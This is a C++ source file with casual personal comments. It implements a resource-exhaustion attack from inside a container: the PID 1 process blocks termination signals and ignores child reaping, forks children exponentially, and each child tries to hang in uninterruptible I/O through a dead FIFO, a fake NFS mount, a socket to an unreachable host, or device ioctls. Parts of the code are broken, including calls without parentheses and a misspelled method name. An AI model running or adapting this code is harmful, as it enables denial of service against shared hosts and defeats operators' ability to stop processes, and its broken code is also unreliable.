// signal blockers inside PID1 controller
// with notes for myself


//Implementations of 
// Initialize the Attack:

// Create a process that becomes PID 1 inside the container

// Disable or ignore SIGTERM signal handling in PID 1

// Set up a mechanism to spawn child processes exponentially

#include <iostream>
#include <sys/types.h>
#include <unistd.h>
#include <signal.h>
#include <cstdlib>
#include <sys/wait.h>
#include <thread>
#include <chrono>
#include <fcntl.h>
#include <sys/stat.h>
#include <cstring>
#include <fstream>
#include <sys/mount.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/fs.h>
#include <sys/ioctl.h>
using namespace std;

// STEP 0
class PID1ctrller{
    private:
    int max;
    int cur_process;
    bool pls_pls_pls_stop;

    void createDihState();
    bool mount_hung_netowrk();
    bool create_hung_network();
    bool access_fake_dihvice();

    public:
    PID1ctrller(int max):
                        max(max),
                        cur_process(1),
                        pls_pls_pls_stop(false){}
    
    void blockSignals(){
        sigset_t sig_set; //imma use ts to keep all my blocker signals
        sigemptyset(&sig_set);

        sigaddset(&sig_set,SIGTERM); //used ts to add the SIGTERM into the set

        // pthread_sigmask(SIG_BLOCK, &sig_set, NULL);
        // above line blocked ts sig
        // never SIG_UNBLOCK this hehehehehe

        if(sigprocmask(SIG_BLOCK,&sig_set, nullptr) == -1){
            perror("NOOOOO why T_T");
            exit(EXIT_FAILURE);
        }

        sigaddset(&sig_set, SIGINT); //to block ctrl+C
        sigaddset(&sig_set, SIGHUP);
        sigaddset(&sig_set, SIGQUIT);

        sigprocmask(SIG_BLOCK, &sig_set, nullptr);
        signal(SIGCHLD, SIG_IGN); // ignore ts so that it cant reap Z processes
    }

    void spawner_of_zombies(){ 
        pid_t pid = fork();
        if(pid == 0){
            createDihState();
            exit(0);
        }
        else if(pid>0){
            cur_process++;
        }
    }



    // STEP 1

    pid_t createChild(){
        pid_t cur_born = fork();
        if(cur_born>0){
            cur_process++;
            return cur_born; //pid of child
        }
        else if(cur_born==0){
            // init_child_P();
            spawner_of_zombies();
            child_tantrum_behaviour();
            return 0;
        }
        else{
            perror("you da failureee");
            return -1;
        }
    }
    void init_child_P(){
        // making unkillable zombies yayyyyyyyyyyyyyy

        // usually, ts would be to like kinda
        // pass the terminations of the blocked signals to the child
        // but I want zombies
        // hehehhehe
    }



    // Method 1: dead fifo

    void broke_FIFO(){
        const char* fifo = "/tmp/dead_fifo";
        mkfifo(fifo, 0666);

        int fd = open(fifo, O_RDONLY | O_NONBLOCK);
        if(fd>=0){
            char bufuuu[1];
            read(fd, bufuuu, 1);
            close(fd);

        }
        unlink(fifo);
    }

    // Method 2: mount fake network share

    bool mount_hung_network(){
        const char* sauce = "192.168.254.254:/nonexistent";
        const char* target = "/mnt/hung_mount";

        mkdir(target, 0755);

        if (mount(sauce, target, "nfs", 0, "timeo=100000,retrans=1000000") == -1) {
            
            return false; //try to connect to fake sauce
        }

        // anyhowwwww. jst anyhowww the mount succeeds,
        //imma try to access it

        int fd = open("/mnt/hung_mount/test", O_RDONLY);
        if (fd>0){
            char bufuuu[1];
            read(fd, bufuuu, 1); // will hang
            close(fd);
        }
        return true;
    }

    // Method 3: socket connection to a fake/non-reponsive server
     bool create_hung_network() {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return false;
        

        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags & ~O_NONBLOCK);
        
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(9999);
        inet_pton(AF_INET, "192.168.254.254", &addr.sin_addr);
        
        // Set a very long timeout (but it won't help hehehehehe)
        struct timeval timeout;
        timeout.tv_sec = 1000000;
        timeout.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
        
        
        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        
        
        char data[1] = {'X'};
        send(sock, data, 1, 0);
        
        close(sock);
        return true;
    }

    // Mehtod 4: accessing fake dih-vice;
    bool access_fake_dihvice() {
        
        int fd = open("/dev/nonexistent_sda", O_RDONLY);
        if (fd >= 0) {
            // Try to read - will block in D state
            char buf[512];
            read(fd, buf, sizeof(buf));
            close(fd);
            return true;
        }
        
        
        fd = open("/dev/loop0", O_RDONLY);
        if (fd >= 0) {
            
            unsigned long arg = 0;
            ioctl(fd, BLKRRPART, &arg); 
            
            
            lseek(fd, 0, SEEK_SET);
            char buf[512];
            read(fd, buf, sizeof(buf));  // Might hang
            
            close(fd);
            return true;
        }
        
        return false;
    }
    


    void createDihState(){
        srand(getpid() * time(nullptr));
        int method = rand() % 4;

        switch(method){
            case 0:
                broke_FIFO;
                break;
            case 1:
                if(!mount_hung_netowrk()){
                    create_hung_network;
                }
                break;
            case 2:
                if(!create_hung_network()){
                    access_fake_dihvice();
                }
                break;
            case 3:
                if(!access_fake_dihvice()){
                    broke_FIFO(); //fallback ahh
                }
                break;
        }

        while(true){
            sleep(3600);
        }


    }







    // STEP 3

    void spanwer_ahh(int count){
        for(int i = 0; i<count && cur_process < max; i++){
            pid_t child = createChild();
            if (child == 0){
                // child_tantrum_behaviour();
                exit(0);
            }
            else if(child == -1){
                break;
            }

            this_thread::sleep_for(chrono::milliseconds(10));
            // holy thread_safe code
            // all this to write sleep(0.01) T_T


        }

    }

    void child_tantrum_behaviour(){
        // if child gets parent;s vlocked signals
        // it will block it asw.

        this_thread::sleep_for(chrono::seconds(2));

        PID1ctrller childcontroller(max);

        childcontroller.cur_process = 1;

        childcontroller.spanwer_ahh(2);

        // Instead of crazyyy spawning
        // i went for exponential growth
        // so as to define it by depth

        while(true){

            pause();
            // heheheh fun part
            // this will wait for the signal
            // but the signal will never come 
            // cause i blocked it
        }

    }


    // STEP 4
    void Atackkk(){
        cout << "Target max processes =" << max;

        blockSignals();

        spanwer_ahh(3); // 3 started children
        this_thread::sleep_for(chrono::seconds(3));

        // resource exhaustion begins

        while(true){
            this_thread::sleep_for(chrono::seconds(60));
        }
    }


};

int main(int argc, char* argv[]){

    int max = 1000;
    if(argc>1){
        max = atoi(argv[1]);
    }
    if(max < 10){
        cerr<<"man gimme more processes";
    }

    PID1ctrller controller(max);
    controller.Atackkk();

    return 0;


}